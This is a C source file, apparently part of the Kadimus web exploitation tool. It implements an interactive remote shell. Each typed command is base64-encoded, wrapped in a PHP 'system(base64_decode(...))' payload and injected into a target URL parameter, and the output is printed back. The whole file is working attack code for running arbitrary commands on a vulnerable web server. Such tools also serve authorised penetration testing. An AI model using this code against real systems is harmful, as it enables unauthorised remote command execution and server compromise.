#include "fun/exec-php-code.h"
#include "string/base64.h"
#include "memory/alloc.h"

#include <stdio.h>
#include <string.h>

void rce_http_shell(const char *url, const char *parameter, int technique)
{
	char *ptr = NULL, *code;
	size_t size = 0;
	ssize_t n;

	setvbuf(stdout, NULL, _IONBF, 0);

	while (1) {
		printf("(kadimus~shell)> ");
		if ((n = getline(&ptr, &size, stdin)) == -1) {
			break;
		}

		if (n == 1 && ptr[0] == '\n') {
			continue;
		}

		if (ptr[n - 1] == '\n') {
			ptr[--n] = 0x0;
		}

		if (!strcmp(ptr, "exit")) {
			break;
		}

		char *b64cmd = b64encode(ptr, n);
		xmalloc(code, strlen(b64cmd) + 36);

		sprintf(code, "<?php system(base64_decode(\"%s\")); ?>", b64cmd);

		char *rce = exec_php_code(url, parameter, code, technique);
		if (rce) {
			printf("%s", rce);
			free(rce);
		}

		free(b64cmd);
		free(code);
	}

	free(ptr);
}
